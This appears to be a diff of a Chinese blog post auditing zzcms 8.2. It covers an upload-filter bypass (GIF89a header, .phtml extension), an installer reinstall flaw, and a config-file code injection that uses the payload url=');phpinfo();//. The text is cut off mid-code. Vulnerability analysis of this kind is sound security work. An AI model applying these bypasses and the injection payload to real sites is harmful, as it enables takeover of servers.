-<p>该文件中定义了一个处理上传图片的类 upload，其中的 upfile() 方法对文件进行了检测，先判断文件是否存在，再判断文件大小，接着检查文件类型和文件后缀。<br>在检查文件类型中，可以用 GIF89a 的头部绕过检查，在检查文件后缀中，黑名单少过滤了 phtml，在 apache 中，会将 phtml 文件按照 php 文件来解析。<br>继续看<code>uploadimg.php</code>，可以看到下面实例化了 upload 类，并调用了 upfile() 方法对上传的文件进行检测并上传该文件到服务器。<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// line 148</span></span><br><span class="line">$filename = <span class="keyword">array</span>();   </span><br><span class="line"><span class="keyword">for</span> ($i = <span class="number">0</span>; $i &lt; count($_FILES[<span class="string">'g_fu_image'</span>][<span class="string">'name'</span>]); $i++)&#123; </span><br><span class="line">    $filename[$i][<span class="string">'name'</span>]=$_FILES[<span class="string">'g_fu_image'</span>][<span class="string">'name'</span>][$i];</span><br><span class="line">    $filename[$i][<span class="string">'type'</span>]=$_FILES[<span class="string">'g_fu_image'</span>][<span class="string">'type'</span>][$i];</span><br><span class="line">    $filename[$i][<span class="string">'tmp_name'</span>]=$_FILES[<span class="string">'g_fu_image'</span>][<span class="string">'tmp_name'</span>][$i];</span><br><span class="line">    $filename[$i][<span class="string">'error'</span>]=$_FILES[<span class="string">'g_fu_image'</span>][<span class="string">'error'</span>][$i];</span><br><span class="line">    $filename[$i][<span class="string">'size'</span>]=$_FILES[<span class="string">'g_fu_image'</span>][<span class="string">'size'</span>][$i];</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">for</span> ($i = <span class="number">0</span>; $i &lt; count($filename); $i++)&#123;  </span><br><span class="line">    $filetype=strtolower(strrchr($filename[$i][<span class="string">'name'</span>],<span class="string">"."</span>));<span class="comment">//图片的类型,统一转为小写</span></span><br><span class="line">    $up = <span class="keyword">new</span> upload();</span><br><span class="line">    $up-&gt;fileName = $filename[$i];</span><br><span class="line">    $up-&gt;fdir=<span class="string">'uploadfiles/'</span>.date(<span class="string">"Y-m"</span>).<span class="string">'/'</span>;   <span class="comment">//上传的路径</span></span><br><span class="line">    $up-&gt;datu=date(<span class="string">"YmdHis"</span>).rand(<span class="number">100</span>,<span class="number">999</span>).$filetype;<span class="comment">//大图的命名</span></span><br><span class="line">    $up-&gt;upfile();</span><br></pre></td></tr></table></figure></p>
+<p>该页面的文件上传的表单提交到<code>/uploadimg.php</code>中：</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">// /uploadimg_form.php line 61</span><br><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">"uploadimg.php"</span> <span class="attr">method</span>=<span class="string">"post"</span> <span class="attr">enctype</span>=<span class="string">"multipart/form-data"</span> <span class="attr">onSubmit</span>=<span class="string">"return mysub()"</span> <span class="attr">style</span>=<span class="string">"padding:10px"</span> <span class="attr">target</span>=<span class="string">"doaction"</span>&gt;</span></span><br><span class="line">  ...</span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"file"</span> <span class="attr">name</span>=<span class="string">"g_fu_image[]"</span> /&gt;</span><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"submit"</span> <span class="attr">name</span>=<span class="string">"Submit"</span> <span class="attr">value</span>=<span class="string">"提交"</span> /&gt;</span></span><br><span class="line">  ...</span><br></pre></td></tr></table></figure>
+
+<p>看一下<code>/uploadimg.php</code>是如何处理的：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// line 9</span></span><br><span class="line"><span class="comment">//上传图片的类--------------------------------------------------------------</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">upload</span></span>&#123;</span><br><span class="line">    ...</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">upfile</span><span class="params">()</span> </span>&#123;</span><br><span class="line"><span class="comment">//是否存在文件</span></span><br><span class="line">        <span class="keyword">if</span> (!is_uploaded_file(@<span class="keyword">$this</span>-&gt;fileName[tmp_name]))&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">"&lt;script&gt;alert('请点击“浏览”，先选择您要上传的文件！\\n\\n支持的图片类型为：jpg,gif,png,bmp');parent.window.close();&lt;/script&gt;"</span>; <span class="keyword">exit</span>;</span><br><span class="line">        &#125;</span><br><span class="line"><span class="comment">//检查文件大小</span></span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">$this</span>-&gt;max_file_size*<span class="number">1024</span> &lt; <span class="keyword">$this</span>-&gt;fileName[<span class="string">"size"</span>])&#123;</span><br><span class="line">           <span class="keyword">echo</span> <span class="string">"&lt;script&gt;alert('文件大小超过了限制！最大只能上传 "</span>.<span class="keyword">$this</span>-&gt;max_file_size.<span class="string">" K的文件');parent.window.close();&lt;/script&gt;"</span>;<span class="keyword">exit</span>;</span><br><span class="line">        &#125;</span><br><span class="line"><span class="comment">//检查文件类型//这种通过在文件头加GIF89A，可骗过</span></span><br><span class="line">        <span class="keyword">if</span> (!in_array(<span class="keyword">$this</span>-&gt;fileName[<span class="string">"type"</span>], <span class="keyword">$this</span>-&gt;uptypes)) &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">"&lt;script&gt;alert('文件类型错误，支持的图片类型为：jpg,gif,png,bmp');parent.window.close();&lt;/script&gt;"</span>;<span class="keyword">exit</span>;</span><br><span class="line">        &#125;</span><br><span class="line"><span class="comment">//检查文件后缀</span></span><br><span class="line">        $hzm=strtolower(substr(<span class="keyword">$this</span>-&gt;fileName[<span class="string">"name"</span>],strpos(<span class="keyword">$this</span>-&gt;fileName[<span class="string">"name"</span>],<span class="string">"."</span>)));<span class="comment">//获取.后面的后缀，如可获取到.php.gif</span></span><br><span class="line">        <span class="keyword">if</span> (strpos($hzm,<span class="string">"php"</span>)!==<span class="keyword">false</span> || strpos($hzm,<span class="string">"asp"</span>)!==<span class="keyword">false</span> ||strpos($hzm,<span class="string">"jsp"</span>)!==<span class="keyword">false</span>)&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">"&lt;script&gt;alert('"</span>.$hzm.<span class="string">"，这种文件不允许上传');parent.window.close();&lt;/script&gt;"</span>;<span class="keyword">exit</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>该文件中定义了一个处理上传图片的类 upload，其中的 upfile() 方法对文件进行了检测，先判断文件是否存在，再判断文件大小，接着检查文件类型和文件后缀。<br>在检查文件类型中，可以用 GIF89a 的头部绕过检查，在检查文件后缀中，黑名单少过滤了 phtml，在 apache 中，会将 phtml 文件按照 php 文件来解析。<br>继续看<code>uploadimg.php</code>，可以看到下面实例化了 upload 类，并调用了 upfile() 方法对上传的文件进行检测并上传该文件到服务器。</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// line 148</span></span><br><span class="line">$filename = <span class="keyword">array</span>();   </span><br><span class="line"><span class="keyword">for</span> ($i = <span class="number">0</span>; $i &lt; count($_FILES[<span class="string">'g_fu_image'</span>][<span class="string">'name'</span>]); $i++)&#123; </span><br><span class="line">    $filename[$i][<span class="string">'name'</span>]=$_FILES[<span class="string">'g_fu_image'</span>][<span class="string">'name'</span>][$i];</span><br><span class="line">    $filename[$i][<span class="string">'type'</span>]=$_FILES[<span class="string">'g_fu_image'</span>][<span class="string">'type'</span>][$i];</span><br><span class="line">    $filename[$i][<span class="string">'tmp_name'</span>]=$_FILES[<span class="string">'g_fu_image'</span>][<span class="string">'tmp_name'</span>][$i];</span><br><span class="line">    $filename[$i][<span class="string">'error'</span>]=$_FILES[<span class="string">'g_fu_image'</span>][<span class="string">'error'</span>][$i];</span><br><span class="line">    $filename[$i][<span class="string">'size'</span>]=$_FILES[<span class="string">'g_fu_image'</span>][<span class="string">'size'</span>][$i];</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">for</span> ($i = <span class="number">0</span>; $i &lt; count($filename); $i++)&#123;  </span><br><span class="line">    $filetype=strtolower(strrchr($filename[$i][<span class="string">'name'</span>],<span class="string">"."</span>));<span class="comment">//图片的类型,统一转为小写</span></span><br><span class="line">    $up = <span class="keyword">new</span> upload();</span><br><span class="line">    $up-&gt;fileName = $filename[$i];</span><br><span class="line">    $up-&gt;fdir=<span class="string">'uploadfiles/'</span>.date(<span class="string">"Y-m"</span>).<span class="string">'/'</span>;   <span class="comment">//上传的路径</span></span><br><span class="line">    $up-&gt;datu=date(<span class="string">"YmdHis"</span>).rand(<span class="number">100</span>,<span class="number">999</span>).$filetype;<span class="comment">//大图的命名</span></span><br><span class="line">    $up-&gt;upfile();</span><br></pre></td></tr></table></figure>
+
 <p>回到<code>/uploadimg.form.php</code>页面，上传文件并抓包：</p>
 <p><img src="https://raw.githubusercontent.com/LLfam/pictures/master/blog/zzcms%208.2/31.png" alt="31"></p>
 <h3 id="网站重装"><a href="#网站重装" class="headerlink" title="网站重装"></a>网站重装</h3><p>相关目录：<br>/install：安装程序目录。</p>
-<p>看一下<code>/install/index.php</code>文件，该文件中并没有检测<code>/install/install.lock</code>文件是否存在。<br><code>/instal/index.php</code>中有关代码如下：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">$step = <span class="keyword">isset</span>($_POST[<span class="string">'step'</span>]) ? $_POST[<span class="string">'step'</span>] : <span class="number">1</span>;</span><br><span class="line">...</span><br><span class="line"><span class="keyword">switch</span>($step) &#123;</span><br><span class="line">    <span class="keyword">case</span> <span class="string">'1'</span>:<span class="comment">//协议</span></span><br><span class="line">        <span class="keyword">include</span> <span class="string">'step_'</span>.$step.<span class="string">'.php'</span>;</span><br><span class="line">    <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="string">'2'</span>:</span><br><span class="line">        ...</span><br><span class="line">        <span class="keyword">include</span> <span class="string">'step_'</span>.$step.<span class="string">'.php'</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="string">'3'</span>:</span><br><span class="line">        ...</span><br><span class="line">        <span class="keyword">include</span> <span class="string">'step_'</span>.$step.<span class="string">'.php'</span>; </span><br><span class="line">    <span class="keyword">case</span> <span class="string">'4'</span>:</span><br><span class="line">        ...</span><br><span class="line">        <span class="keyword">include</span> <span class="string">'step_'</span>.$step.<span class="string">'.php'</span>;  </span><br><span class="line">    <span class="keyword">case</span> <span class="string">'5'</span>:</span><br><span class="line">        ...</span><br><span class="line">        <span class="keyword">include</span> <span class="string">'step_'</span>.$step.<span class="string">'.php'</span>;   </span><br><span class="line">    <span class="keyword">case</span> <span class="string">'6'</span>:</span><br><span class="line">        <span class="keyword">include</span> <span class="string">'step_'</span>.$step.<span class="string">'.php'</span>;</span><br><span class="line">    <span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
-<p>上面审计 xss 的时候看过了，只有<code>/install/step_1.php</code>文件在开头检查了<code>/install/install.lock</code>。<br>而在<code>/install/step_2.php</code>、<code>/install/step_3.php</code>、<code>/install/step_4.php</code>、<code>/install/step_5.php</code>、<code>/install/step_6.php</code>文件中都没有对<code>/install/install.lock</code>文件进行检查。<br>我们只需要 post 传入 id，并设置其值为 2、3、4、5、6 之一即可。</p>
+<p>看一下<code>/install/index.php</code>文件，该文件中并没有检测<code>/install/install.lock</code>文件是否存在。<br><code>/instal/index.php</code>中有关代码如下：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">$step = <span class="keyword">isset</span>($_POST[<span class="string">'step'</span>]) ? $_POST[<span class="string">'step'</span>] : <span class="number">1</span>;</span><br><span class="line">...</span><br><span class="line"><span class="keyword">switch</span>($step) &#123;</span><br><span class="line">    <span class="keyword">case</span> <span class="string">'1'</span>:<span class="comment">//协议</span></span><br><span class="line">        <span class="keyword">include</span> <span class="string">'step_'</span>.$step.<span class="string">'.php'</span>;</span><br><span class="line">    <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="string">'2'</span>:</span><br><span class="line">        ...</span><br><span class="line">        <span class="keyword">include</span> <span class="string">'step_'</span>.$step.<span class="string">'.php'</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="string">'3'</span>:</span><br><span class="line">        ...</span><br><span class="line">        <span class="keyword">include</span> <span class="string">'step_'</span>.$step.<span class="string">'.php'</span>; </span><br><span class="line">    <span class="keyword">case</span> <span class="string">'4'</span>:</span><br><span class="line">        ...</span><br><span class="line">        <span class="keyword">include</span> <span class="string">'step_'</span>.$step.<span class="string">'.php'</span>;  </span><br><span class="line">    <span class="keyword">case</span> <span class="string">'5'</span>:</span><br><span class="line">        ...</span><br><span class="line">        <span class="keyword">include</span> <span class="string">'step_'</span>.$step.<span class="string">'.php'</span>;   </span><br><span class="line">    <span class="keyword">case</span> <span class="string">'6'</span>:</span><br><span class="line">        <span class="keyword">include</span> <span class="string">'step_'</span>.$step.<span class="string">'.php'</span>;</span><br><span class="line">    <span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>上面审计 xss 的时候看过了，只有<code>/install/step_1.php</code>文件在开头检查了<code>/install/install.lock</code>。
+而在<code>/install/step_2.php</code>、<code>/install/step_3.php</code>、<code>/install/step_4.php</code>、<code>/install/step_5.php</code>、<code>/install/step_6.php</code>文件中都没有对<code>/install/install.lock</code>文件进行检查。<br>我们只需要 post 传入 id，并设置其值为 2、3、4、5、6 之一即可。</p>
 <p><img src="https://raw.githubusercontent.com/LLfam/pictures/master/blog/zzcms%208.2/32.png" alt="32"></p>
 <p>该漏洞利用不需要带前台用户的 cookie，可以看到我们进入了安装向导的界面。<br>同理 step 传入 3 也一样可以触发该漏洞：</p>
 <p><img src="https://raw.githubusercontent.com/LLfam/pictures/master/blog/zzcms%208.2/33.png" alt="33"></p>
 <p>该重装的漏洞的利用需要管理未删除<code>/install</code>文件夹及里面相应的文件。</p>
 <h3 id="getshell"><a href="#getshell" class="headerlink" title="getshell"></a>getshell</h3><p>相关目录：<br>/install：安装程序目录。</p>
-<p>还是看<code>/install/index.php</code>文件。开头用 extract() 注册变量，且该文件并没有对 post、get 数组中的数据进行过滤。<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>($_POST) extract($_POST, EXTR_SKIP);</span><br><span class="line"><span class="keyword">if</span>($_GET) extract($_GET, EXTR_SKIP);</span><br></pre></td></tr></table></figure></p>
-<p>下面的 switch 分支主要看 step = 5 的分支：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">switch</span>($step) &#123;</span><br><span class="line">    <span class="keyword">case</span> <span class="string">'1'</span>:<span class="comment">//协议</span></span><br><span class="line">        <span class="keyword">include</span> <span class="string">'step_'</span>.$step.<span class="string">'.php'</span>;</span><br><span class="line">    <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="string">'2'</span>:</span><br><span class="line">        ...</span><br><span class="line">    <span class="keyword">case</span> <span class="string">'3'</span>:</span><br><span class="line">        ...</span><br><span class="line">    <span class="keyword">case</span> <span class="string">'4'</span>:</span><br><span class="line">        ...</span><br><span class="line">    <span class="keyword">case</span> <span class="string">'5'</span>:<span class="comment">//安装进度</span></span><br><span class="line">        <span class="function"><span class="keyword">function</span> <span class="title">dexit</span><span class="params">($msg)</span> </span>&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">'&lt;script&gt;alert("'</span>.$msg.<span class="string">'");window.history.back();&lt;/script&gt;'</span>;</span><br><span class="line">            <span class="keyword">exit</span>;</span><br><span class="line">        &#125;</span><br><span class="line">		</span><br><span class="line">        $conn=connect($db_host,$db_user,$db_pass,<span class="string">''</span>,$db_port);</span><br><span class="line">        <span class="keyword">if</span>(!$conn) dexit(<span class="string">'无法连接到数据库服务器，请检查配置'</span>);</span><br><span class="line">        $db_name <span class="keyword">or</span> dexit(<span class="string">'请填写数据库名'</span>);</span><br><span class="line">        <span class="keyword">if</span>(!select_db($db_name)) &#123;</span><br><span class="line">            <span class="keyword">if</span>(!query(<span class="string">"CREATE DATABASE $db_name"</span>)) dexit(<span class="string">'指定的数据库不存在\n\n系统尝试创建失败，请通过其他方式建立数据库'</span>);</span><br><span class="line">        &#125;</span><br><span class="line">		</span><br><span class="line">		<span class="comment">//保存配置文件</span></span><br><span class="line">        $fp=<span class="string">"../inc/config.php"</span>;</span><br><span class="line">        $f = fopen($fp,<span class="string">'r'</span>);</span><br><span class="line">        $str = fread($f,filesize($fp));</span><br><span class="line">        fclose($f);</span><br><span class="line">        $str=str_replace(<span class="string">"define('sqlhost','"</span>.sqlhost.<span class="string">"')"</span>,<span class="string">"define('sqlhost','$db_host')"</span>,$str) ;</span><br><span class="line">        $str=str_replace(<span class="string">"define('sqlport','"</span>.sqlport.<span class="string">"')"</span>,<span class="string">"define('sqlport','$db_port')"</span>,$str) ;</span><br><span class="line">        $str=str_replace(<span class="string">"define('sqldb','"</span>.sqldb.<span class="string">"')"</span>,<span class="string">"define('sqldb','$db_name')"</span>,$str) ;</span><br><span class="line">        $str=str_replace(<span class="string">"define('sqluser','"</span>.sqluser.<span class="string">"')"</span>,<span class="string">"define('sqluser','$db_user')"</span>,$str) ;</span><br><span class="line">        $str=str_replace(<span class="string">"define('sqlpwd','"</span>.sqlpwd.<span class="string">"')"</span>,<span class="string">"define('sqlpwd','$db_pass')"</span>,$str) ;</span><br><span class="line">        $str=str_replace(<span class="string">"define('siteurl','"</span>.siteurl.<span class="string">"')"</span>,<span class="string">"define('siteurl','$url')"</span>,$str) ;</span><br><span class="line">        $str=str_replace(<span class="string">"define('logourl','"</span>.logourl.<span class="string">"')"</span>,<span class="string">"define('logourl','$url/image/logo.png')"</span>,$str) ;</span><br><span class="line">        $f=fopen($fp,<span class="string">"w+"</span>);<span class="comment">//fopen()的其它开关请参看相关函数</span></span><br><span class="line">        fputs($f,$str);<span class="comment">//把替换后的内容写入文件</span></span><br><span class="line">        fclose($f);</span><br><span class="line">		<span class="comment">//创建数据</span></span><br><span class="line">        <span class="keyword">include</span> <span class="string">'step_'</span>.$step.<span class="string">'.php'</span>;</span><br><span class="line">    <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="string">'6'</span>:</span><br><span class="line">        <span class="keyword">include</span> <span class="string">'step_'</span>.$step.<span class="string">'.php'</span>;</span><br><span class="line">    <span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
-<p>该分支中先定义了一个<code>dexit()</code>函数，之后进行了数据库连接：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">$conn=connect($db_host,$db_user,$db_pass,<span class="string">''</span>,$db_port);</span><br><span class="line"><span class="keyword">if</span>(!$conn) dexit(<span class="string">'无法连接到数据库服务器，请检查配置'</span>);</span><br><span class="line">$db_name <span class="keyword">or</span> dexit(<span class="string">'请填写数据库名'</span>);</span><br><span class="line"><span class="keyword">if</span>(!select_db($db_name)) &#123;</span><br><span class="line">    <span class="keyword">if</span>(!query(<span class="string">"CREATE DATABASE $db_name"</span>)) dexit(<span class="string">'指定的数据库不存在\n\n系统尝试创建失败，请通过其他方式建立数据库'</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
-<p>可以看到如果连接失败，就会调用 dexit() 函数终止脚本的执行，这样下面的代码就不会执行。为了让数据库正确连接，则 db_host、db_user、db_pass、db_port、db_name 这4个变量我们就不可控。<br>接下来是对<code>/inc/config.php</code>文件进行操作，该文件里面定义了安装完 cms 后需要用到的各种常量。<br><code>/install/index.php</code>中先读取了<code>/inc/config.php</code>的内容，并根据我们安装时设置的初始化信息对该内容进行修改，之后再存回<code>/inc/config.php</code>中。<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//保存配置文件</span></span><br><span class="line">$fp=<span class="string">"../inc/config.php"</span>;</span><br><span class="line">$f = fopen($fp,<span class="string">'r'</span>);</span><br><span class="line">$str = fread($f,filesize($fp));</span><br><span class="line">fclose($f);</span><br><span class="line">$str=str_replace(<span class="string">"define('sqlhost','"</span>.sqlhost.<span class="string">"')"</span>,<span class="string">"define('sqlhost','$db_host')"</span>,$str) ;</span><br><span class="line">$str=str_replace(<span class="string">"define('sqlport','"</span>.sqlport.<span class="string">"')"</span>,<span class="string">"define('sqlport','$db_port')"</span>,$str) ;</span><br><span class="line">$str=str_replace(<span class="string">"define('sqldb','"</span>.sqldb.<span class="string">"')"</span>,<span class="string">"define('sqldb','$db_name')"</span>,$str) ;</span><br><span class="line">$str=str_replace(<span class="string">"define('sqluser','"</span>.sqluser.<span class="string">"')"</span>,<span class="string">"define('sqluser','$db_user')"</span>,$str) ;</span><br><span class="line">$str=str_replace(<span class="string">"define('sqlpwd','"</span>.sqlpwd.<span class="string">"')"</span>,<span class="string">"define('sqlpwd','$db_pass')"</span>,$str) ;</span><br><span class="line">$str=str_replace(<span class="string">"define('siteurl','"</span>.siteurl.<span class="string">"')"</span>,<span class="string">"define('siteurl','$url')"</span>,$str) ;</span><br><span class="line">$str=str_replace(<span class="string">"define('logourl','"</span>.logourl.<span class="string">"')"</span>,<span class="string">"define('logourl','$url/image/logo.png')"</span>,$str) ;</span><br><span class="line">$f=fopen($fp,<span class="string">"w+"</span>);<span class="comment">//fopen()的其它开关请参看相关函数</span></span><br><span class="line">fputs($f,$str);<span class="comment">//把替换后的内容写入文件</span></span><br><span class="line">fclose($f);</span><br></pre></td></tr></table></figure></p>
-<p>因为数据库连接的原因，前几个变量的值我们不可控，而 url 变量我们是可控，如下：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$str=str_replace(<span class="string">"define('siteurl','"</span>.siteurl.<span class="string">"')"</span>,<span class="string">"define('siteurl','$url')"</span>,$str) ;</span><br><span class="line">$str=str_replace(<span class="string">"define('logourl','"</span>.logourl.<span class="string">"')"</span>,<span class="string">"define('logourl','$url/image/logo.png')"</span>,$str) ;</span><br></pre></td></tr></table></figure></p>
-<p>str 的内容就是<code>/inc/config.php</code>中的内容，看一下相应部分：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// /inc/config.php line 9</span></span><br><span class="line">define(<span class="string">'siteurl'</span>,<span class="string">'http://cp.com'</span>) ;<span class="comment">//网站地址</span></span><br></pre></td></tr></table></figure></p>
-<p>这里我们只要闭合单引号，并注释后面部分即可。<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">payload:</span><br><span class="line">url=<span class="string">');phpinfo();//</span></span><br></pre></td></tr></table></figure></p>
-<p>经过替换后<code>/inc/config.php</code>的内容被更改为：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 原来：define('siteurl','http://cp.com') ;//网站地址</span></span><br><span class="line">define(<span class="string">'siteurl'</span>,<span class="string">''</span>);phpinfo();<span class="comment">//') ;//网站地址</span></span><br></pre></td></tr></table></figure></p>
+<p>还是看<code>/install/index.php</code>文件。开头用 extract() 注册变量，且该文件并没有对 post、get 数组中的数据进行过滤。</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>($_POST) extract($_POST, EXTR_SKIP);</span><br><span class="line"><span class="keyword">if</span>($_GET) extract($_GET, EXTR_SKIP);</span><br></pre></td></tr></table></figure>
+
+<p>下面的 switch 分支主要看 step = 5 的分支：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">switch</span>($step) &#123;</span><br><span class="line">    <span class="keyword">case</span> <span class="string">'1'</span>:<span class="comment">//协议</span></span><br><span class="line">        <span class="keyword">include</span> <span class="string">'step_'</span>.$step.<span class="string">'.php'</span>;</span><br><span class="line">    <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="string">'2'</span>:</span><br><span class="line">        ...</span><br><span class="line">    <span class="keyword">case</span> <span class="string">'3'</span>:</span><br><span class="line">        ...</span><br><span class="line">    <span class="keyword">case</span> <span class="string">'4'</span>:</span><br><span class="line">        ...</span><br><span class="line">    <span class="keyword">case</span> <span class="string">'5'</span>:<span class="comment">//安装进度</span></span><br><span class="line">        <span class="function"><span class="keyword">function</span> <span class="title">dexit</span><span class="params">($msg)</span> </span>&#123;</span><br><span class="line">            <span 